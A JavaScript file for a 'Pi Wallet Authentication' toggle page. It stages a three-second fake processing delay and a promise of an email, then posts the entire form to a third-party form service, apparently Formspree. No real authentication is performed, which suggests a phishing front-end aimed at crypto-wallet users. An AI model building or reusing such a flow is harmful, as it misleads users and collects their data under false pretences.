const toggleBtn = document.getElementById("toggleBtn");
const statusText = document.getElementById("statusText");
const form = document.getElementById("toggleForm");
const actionField = document.getElementById("actionField");
const emailInput = document.querySelector(".email-input");

let isOn = false;
let isProcessing = false; // Prevent multiple clicks during delay

// Prevent normal form submission
form.addEventListener("submit", (e) => {
    e.preventDefault();
});

toggleBtn.addEventListener("click", async () => {
    if (!emailInput.value) {
        alert("Please enter your email before authenticating.");
        return;
    }

    // Prevent clicking while processing
    if (isProcessing) {
        return;
    }

    isProcessing = true;
    
    // Show processing message
    statusText.textContent = "Processing...";
    statusText.style.color = "#f39c12";
    
    // Disable toggle button visually
    toggleBtn.style.opacity = "0.6";
    toggleBtn.style.cursor = "not-allowed";

    // Wait 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));

    // Toggle the state
    isOn = !isOn;
    toggleBtn.classList.toggle("on", isOn);

    const action = isOn
        ? "Pi Wallet Authentication ON, An email will be sent to you shortly"
        : "Pi Wallet Authentication OFF";

    statusText.textContent = `You have ${action}`;
    statusText.style.color = isOn ? "#27ae60" : "#e74c3c";

    actionField.value = action;

    try {
        const response = await fetch(form.action, {
            method: "POST",
            headers: {
                "Accept": "application/json"
            },
            body: new FormData(form)
        });

        // ✅ DO NOT check response.ok (Formspree may return 302/200)
        // If fetch succeeds, Formspree received it

        console.log("Feedback sent successfully");
    } catch (error) {
        // Only fires if network completely fails
        console.error("Network error:", error);
    }

    // Re-enable toggle button
    toggleBtn.style.opacity = "1";
    toggleBtn.style.cursor = "pointer";
    isProcessing = false;
});